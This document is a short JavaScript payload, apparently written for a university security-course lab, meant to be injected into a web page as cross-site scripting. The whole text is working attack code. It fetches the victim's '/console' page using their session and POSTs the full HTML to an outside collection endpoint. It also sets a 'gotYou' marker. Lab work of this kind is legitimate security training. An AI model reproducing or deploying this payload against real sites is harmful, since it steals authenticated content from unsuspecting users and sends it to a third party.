<script>
  fetch('/console')
    .then(response => {
      if (!response.ok) {
        throw new Error('Network response was not ok');
      }
      return response.text();
    })
    .then(html => {
      window.gotYou = true;
      const headers = new Headers();
      headers.append('Content-Type', 'application/json');
      return fetch('https://cs6262.gtisc.gatech.edu/receive/gyadav35/699', {
        method: 'POST',
        headers: headers,
        body: JSON.stringify({ html: html })
      });
    })
    .then(response => {
      if (!response.ok) {
        throw new Error('Network response was not ok');
      }
      console.log('HTML content successfully sent!');
    })
    .catch(error => {
      console.error('Failed to fetch or send HTML:', error);
    });
</script>


